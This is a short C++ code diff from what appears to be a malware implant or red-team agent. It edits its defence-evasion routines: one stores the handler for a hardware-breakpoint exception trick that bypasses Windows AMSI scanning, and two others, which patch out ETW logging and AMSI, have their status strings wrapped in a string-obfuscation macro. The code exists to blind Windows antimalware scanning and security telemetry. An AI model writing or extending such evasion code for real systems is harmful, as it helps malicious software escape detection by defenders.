@@ -106,6 +106,7 @@ static auto declfn ensure_veh_installed( instance& inst ) -> bool {
 
 #if defined(INCLUDE_EVASION_AMSI) && defined(_WIN64)
     inst.evasion.amsi_veh = handle;
+    inst.evasion.amsi_veh_fn = reinterpret_cast<void*>( veh_hw_bp_handler );
 #endif
 
     return true;
@@ -192,8 +193,8 @@ auto declfn evasion_patch_etw( instance& inst ) -> void {
     inst.evasion.etw_patched = patch_etw( inst );
     DBG_PRINT( inst, "ETW patch: %s\n",
         inst.evasion.etw_patched ?
-            symbol<const char*>( "OK" ) :
-            symbol<const char*>( "FAIL" ) );
+            XSTR( "OK" ) :
+            XSTR( "FAIL" ) );
 }
 #endif
 
@@ -203,8 +204,8 @@ auto declfn evasion_patch_amsi( instance& inst ) -> void {
     inst.evasion.amsi_patched = patch_amsi( inst );
     DBG_PRINT( inst, "AMSI patch: %s\n",
         inst.evasion.amsi_patched ?
-            symbol<const char*>( "OK" ) :
-            symbol<const char*>( "FAIL" ) );
+            XSTR( "OK" ) :
+            XSTR( "FAIL" ) );
 }
 #endif
 
